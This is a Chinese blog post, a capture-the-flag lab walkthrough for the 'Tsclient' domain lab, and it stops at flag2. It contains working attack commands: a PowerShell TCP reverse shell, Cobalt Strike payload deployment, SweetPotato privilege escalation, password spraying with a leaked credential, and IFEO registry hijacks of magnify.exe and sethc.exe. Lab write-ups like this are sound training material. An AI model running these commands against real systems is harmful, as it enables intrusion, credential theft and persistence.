@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="准备目标靶机ip为：39.99.144.3 分两次打的，中间换了ip flag1fscan直接扫一波。  可以发现直接爆出了mssql的弱口令，我们直接用 MDUT  工具打。  然后我们直接进入功能界面，先激活组件，然后就可以执行命令了。  这里先配置一下cs（第一次用） https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_39190897&#x2F;article&#x2F;details&#x2F;11824352">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜-Tsclient">
+<meta property="og:url" content="http://example.com/2025/02/11/Tsclient/index.html">
+<meta property="og:site_name" content="Mash1r0&#39;Blog">
+<meta property="og:description" content="准备目标靶机ip为：39.99.144.3 分两次打的，中间换了ip flag1fscan直接扫一波。  可以发现直接爆出了mssql的弱口令，我们直接用 MDUT  工具打。  然后我们直接进入功能界面，先激活组件，然后就可以执行命令了。  这里先配置一下cs（第一次用） https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_39190897&#x2F;article&#x2F;details&#x2F;11824352">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141004117.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141004422.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141004284.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141004432.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141004775.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141004072.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141004962.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141005319.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141005907.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141005156.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141005040.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141005469.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141005241.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141005680.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141005911.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141006099.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141006282.png">
+<meta property="og:image" content="http://example.com/Tsclient.assets/1734354571383-e54fb83e-174a-4ccc-b3f1-0b084e474ba3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141006526.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141006192.png">
+<meta property="og:image" content="http://example.com/Tsclient.assets/1734356935346-793b3dcf-56c6-4b1f-a2b4-8411b8acec61.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141006211.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141006204.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141006209.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141007004.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141007358.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141007953.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141007862.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141007051.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141008305.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141008514.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141008913.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141008988.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141008651.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141008339.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141009015.png">
+<meta property="og:image" content="http://example.com/Tsclient.assets/1739176792837-6283bb8f-150b-49cb-9119-6c4867e2c7b0.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141009490.png">
+<meta property="article:published_time" content="2025-02-10T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-03-14T02:13:52.207Z">
+<meta property="article:author" content="Mash1r0">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141004117.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/2.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/2.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/2.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>春秋云镜-Tsclient</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/friends/">Friends</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/12/02/Initial/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/02/11/Tsclient/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/02/11/Tsclient/&text=春秋云镜-Tsclient"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/02/11/Tsclient/&title=春秋云镜-Tsclient"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/02/11/Tsclient/&is_video=false&description=春秋云镜-Tsclient"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云镜-Tsclient&body=Check out this article: http://example.com/2025/02/11/Tsclient/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/02/11/Tsclient/&title=春秋云镜-Tsclient"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/02/11/Tsclient/&title=春秋云镜-Tsclient"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/02/11/Tsclient/&title=春秋云镜-Tsclient"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/02/11/Tsclient/&title=春秋云镜-Tsclient"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/02/11/Tsclient/&name=春秋云镜-Tsclient&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/02/11/Tsclient/&t=春秋云镜-Tsclient"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%86%E5%A4%87"><span class="toc-number">1.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">2.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">3.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3"><span class="toc-number">4.</span> <span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">5.</span> <span class="toc-text">参考文章</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        春秋云镜-Tsclient
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Mash1r0</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-02-10T16:00:00.000Z" class="dt-published" itemprop="datePublished">2025-02-11</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>目标靶机ip为：39.99.144.3</p>
+<p>分两次打的，中间换了ip</p>
+<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a><strong>flag1</strong></h2><p>fscan直接扫一波。</p>
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141004117.png" alt="img"></p>
+<p>可以发现直接爆出了mssql的弱口令，我们直接用 MDUT  工具打。</p>
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141004422.png" alt="img"></p>
+<p>然后我们直接进入功能界面，先激活组件，然后就可以执行命令了。</p>
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141004284.png" alt="img"></p>
+<p>这里先配置一下cs（第一次用）</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/118243520">https://blog.csdn.net/weixin_39190897/article/details/118243520</a></p>
+<p>我们先把teamserver.zip传入到vps上面，然后unzip解压后运行。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./teamserver &lt;host&gt; &lt;password&gt; [/path/to/c2.profile] [YYYY-MM-DD]</span><br><span class="line">&lt;host&gt; // 必需参数 团队服务器IP</span><br><span class="line">&lt;password&gt; // 必需参数 连接服务器的密码</span><br><span class="line">[/path/to/c2.profile] // 可选参数 指定C2通信配置文件，体现其强大的扩展性</span><br><span class="line">[YYYY-MM-DD] // 可选参数 所有payload的终止时间</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141004432.png" alt="img"></p>
+<p>直接运行加上我们vps的ip和想要设置的密码即可，然后cs连接。</p>
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141004775.png" alt="img"></p>
+<p>我们先来创造一个监听器。</p>
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141004072.png" alt="img"></p>
+<p>然后我们在有效载荷地方选择windows的可执行程序。</p>
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141004962.png" alt="img"></p>
+<p>选择我们的监听器，然后会选择一个路径保存文件，我们将该文件上传到靶机中去。我们选择C:&#x2F;Windows&#x2F;Temp&#x2F;这个目录。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:/<span class="title">Windows</span>/<span class="title">Temp</span>/<span class="title">artifact.exe</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141005319.png" alt="img"></p>
+<p>然后去运行它，我们在cs上面就可以接受到会话了。</p>
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141005907.png" alt="img"></p>
+<p>但是权限还是很低。</p>
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141005156.png" alt="img"></p>
+<p>这里我们需要使用printspoofer或者sweetpotato提权。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/dievus/printspoofer">https://github.com/dievus/printspoofer</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/uknowsec/SweetPotato/tree/master?tab=readme-ov-file">https://github.com/uknowsec/SweetPotato/tree/master?tab=readme-ov-file</a></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:/<span class="title">Windows</span>/<span class="title">Temp</span>/<span class="title">SweetPotato.exe</span> -<span class="title">a</span> <span class="title">whoami</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141005040.png" alt="img"></p>
+<p>这里都可以，个人感觉sweetpotato好像好一点？</p>
+<p>拿到了system权限。然后我们再用这个去执行前面传的cs马，上线system权限。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:/<span class="title">Windows</span>/<span class="title">Temp</span>/<span class="title">SweetPotato.exe</span> -<span class="title">a</span> &quot;<span class="title">C</span>:/<span class="title">Windows</span>/<span class="title">Temp</span>/<span class="title">artifact.exe</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141005469.png" alt="img"></p>
+<p>我感觉cs命令执行太慢了，我直接弹shell出来用。用powershell把system的权限弹出来。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell powershell <span class="literal">-nop</span> <span class="literal">-c</span> <span class="string">&quot;<span class="variable">$client</span> = New-Object System.Net.Sockets.TCPClient(&#x27;ip&#x27;,7777);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141005241.png" alt="img"></p>
+<p>我们可以在administrator目录下面看到有一个flag。</p>
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141005680.png" alt="img"></p>
+<p>这是个目录，我们进去可以看到flag1直接拿就行了。</p>
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141005911.png" alt="img"></p>
+<p>flag1为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8619d038-7f50-4e26-bddd-b0edc3f2cf47&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a><strong>flag2</strong></h2><p>上传fscan扫一遍内网。chcp 65001改下编码，然后看看ip所处网段（cs上线的时候也有）。</p>
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141006099.png" alt="img"></p>
+<p>开扫。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan.exe -h 172.22.8.0/24</span><br></pre></td></tr></table></figure>
+
+<details class="lake-collapse"><summary id="ud2e05b3f"><span class="ne-text">结果</span></summary><p id="u3c7b6d96" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">start infoscan                                                                                         <br></span><span class="ne-text">(icmp) Target 172.22.8.18     is alive                                                                 <br></span><span class="ne-text">(icmp) Target 172.22.8.15     is alive                                                                 <br></span><span class="ne-text">(icmp) Target 172.22.8.31     is alive                                                                 <br></span><span class="ne-text">(icmp) Target 172.22.8.46     is alive                                                                 <br></span><span class="ne-text">[*] Icmp alive hosts len is: 4                                                                         <br></span><span class="ne-text">172.22.8.46:445 open                                                                                   <br></span><span class="ne-text">172.22.8.31:445 open                                                                                   <br></span><span class="ne-text">172.22.8.18:1433 open                                                                                  <br></span><span class="ne-text">172.22.8.15:445 open                                                                                   <br></span><span class="ne-text">172.22.8.18:445 open                                                                                   <br></span><span class="ne-text">172.22.8.46:139 open                                                                                   <br></span><span class="ne-text">172.22.8.31:139 open                                                                                   <br></span><span class="ne-text">172.22.8.15:139 open                                                                                   <br></span><span class="ne-text">172.22.8.46:135 open                                                                                   <br></span><span class="ne-text">172.22.8.18:139 open                                                                                   <br></span><span class="ne-text">172.22.8.31:135 open                                                                                   <br></span><span class="ne-text">172.22.8.15:135 open                                                                                   <br></span><span class="ne-text">172.22.8.18:135 open                                                                                   <br></span><span class="ne-text">172.22.8.46:80 open                                                                                    <br></span><span class="ne-text">172.22.8.18:80 open                                                                                    <br></span><span class="ne-text">172.22.8.15:88 open                                                                                    <br></span><span class="ne-text">[*] alive ports len is: 16                                                                             <br></span><span class="ne-text">start vulscan                                                                                          <br></span><span class="ne-text">[*] NetInfo                                                                                            <br></span><span class="ne-text">[*]172.22.8.46                                                                                         <br></span><span class="ne-text">   [-&gt;]WIN2016                                                                                         <br></span><span class="ne-text">   [-&gt;]172.22.8.46                                                                                     <br></span><span class="ne-text">[*] NetBios 172.22.8.15     [+] DC:XIAORANG\DC01                                                       <br></span><span class="ne-text">[*] NetInfo                                                                                            <br></span><span class="ne-text">[*]172.22.8.31                                                                                         <br></span><span class="ne-text">   [-&gt;]WIN19-CLIENT                                                                                    <br></span><span class="ne-text">   [-&gt;]172.22.8.31                                                                                     <br></span><span class="ne-text">[*] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT                                                      <br></span><span class="ne-text">[*] NetInfo                                                                                            <br></span><span class="ne-text">[*]172.22.8.18                                                                                         <br></span><span class="ne-text">   [-&gt;]WIN-WEB                                                                                         <br></span><span class="ne-text">   [-&gt;]172.22.8.18                                                                                     <br></span><span class="ne-text">   [-&gt;]2001:0:348b:fb58:1841:15cd:d89c:6ffc                                                            <br></span><span class="ne-text">[*] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393   <br></span><span class="ne-text">[*] NetInfo                                                                                            <br></span><span class="ne-text">[*]172.22.8.15                                                                                         <br></span><span class="ne-text">   [-&gt;]DC01                                                                                            <br></span><span class="ne-text">   [-&gt;]172.22.8.15                                                                                     <br></span><span class="ne-text">[*] WebTitle http://172.22.8.46        code:200 len:703    title:IIS Windows Server                    <br></span><span class="ne-text">[*] WebTitle http://172.22.8.18        code:200 len:703    title:IIS Windows Server                    <br></span><span class="ne-text">[+] mssql 172.22.8.18:1433:sa 1qaz!QAZ                                                                 <br></span><span class="ne-text">?????16/16                                                                                             <br></span><span class="ne-text">[*] ??????,???: 25.3572412s</span></p></details>
+
+<p>直接交给ai分析一波。</p>
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141006282.png" alt="img"></p>
+<p><img src="/./Tsclient.assets/1734354571383-e54fb83e-174a-4ccc-b3f1-0b084e474ba3.png" alt="img"></p>
+<p>根据端口也没什么好打的洞（这里是都开了3389，但是我没有扫出来），我们再次看18这台。我们可以做一些信息收集。</p>
+<p><code>quser</code> 命令是一个用于显示远程桌面会话主机服务器上的用户会话信息的Windows命令行工具。这个命令可以帮助你确定特定用户是否已经登录到特定的远程桌面会话主机服务器。  </p>
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141006526.png" alt="img"></p>
+<p>可以发现有个john会话为rdp远程连接并且为admin，我们去cs上进行进程注入拿到john的会话。</p>
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141006192.png" alt="img"></p>
+<p><img src="/./Tsclient.assets/1734356935346-793b3dcf-56c6-4b1f-a2b4-8411b8acec61.png" alt="img"></p>
+<p>我们net use会发现它通过tsclient挂载了C盘。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mamiyiya777/p/11017875.html">https://www.cnblogs.com/mamiyiya777/p/11017875.html</a></p>
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141006211.png" alt="img"></p>
+<p>我们去列目录。</p>
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141006204.png" alt="img"></p>
+<p>发现有一个credential.txt文件，<code>credential.txt</code> 文件通常用于存储Git操作中的登录用户名和密码。在使用Git进行版本控制时，为了简化登录流程，避免每次操作都需要手动输入用户名和密码，可以使用凭证存储功能。 </p>
+<p>我们用type命令去读取它。<code>type</code> 是 Windows 命令提示符中的一个命令，用于显示文本文件的内容。  </p>
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141006209.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#</span><br></pre></td></tr></table></figure>
+
+<p>拿到用户名和密码，并且下面有一个提示，你知道如何劫持镜像吗。</p>
+<p>接下来我们直接cs搭建隧道，用socks5就行了。然后修改我们proxychains的配置文件。</p>
+<p>然后进行密码喷洒。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q crackmapexec smb 172.22.8.0/24 -u &#x27;Aldrich&#x27; -p &#x27;Ald@rLMWuy7Z!#&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141007004.png" alt="img"></p>
+<p><code>STATUS_PASSWORD_EXPIRED</code>提示密码过期了。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop 172.22.8.31 -u Aldrich -d xiaorang.lab -p &#x27;Ald@rLMWuy7Z!#&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>尝试登录，会显示过期，这里我们就可以直接通过图形化去修改密码。然后再次登录会发现31这台登录不成功。</p>
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141007358.png" alt="img"></p>
+<p>我们还可以使用 smbpasswd进行修改密码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q python3 smbpasswd.py xiaorang.lab/Aldrich:&#x27;Ald@rLMWuy7Z!#&#x27;@172.22.8.46 -newpass &#x27;Mash1r0&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/Lex-Case/Impacket/tree/master">https://github.com/Lex-Case/Impacket/tree/master</a></p>
+<p>尝试发现只有46这台能够成功登录。我们用win去开rdp，用proxifier配置代理即可，我配置rdp软件走代理好像没成功，指定ip走代理可以。</p>
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141007953.png" alt="img"></p>
+<p>发现权限很低，需要提权。根据前面的提示可以知道IFEO劫持。打开powershell</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get-acl</span> <span class="literal">-path</span> <span class="string">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot;</span> | <span class="built_in">fl</span> *</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141007862.png" alt="img"></p>
+<p> 登录到系统的所有用户可以修改注册表的值和创建子项。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="string">&quot;C:\windows\system32\cmd.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141007051.png" alt="img"></p>
+<p>操作成功之后锁定，然后点击右下角的放大镜。</p>
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141008305.png" alt="img"></p>
+<p>也可以参考X1r0z的payload，按五次shift键就行了。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141008514.png" alt="img"></p>
+<p>成功拿到system权限，在前面flag1相同的目录下面可以找到flag2。</p>
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141008913.png" alt="img"></p>
+<p>flag2为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;11b351ae-aaac-45d6-95a4-f6ef22bcbdc9&#125;</span><br></pre></td></tr></table></figure>
+
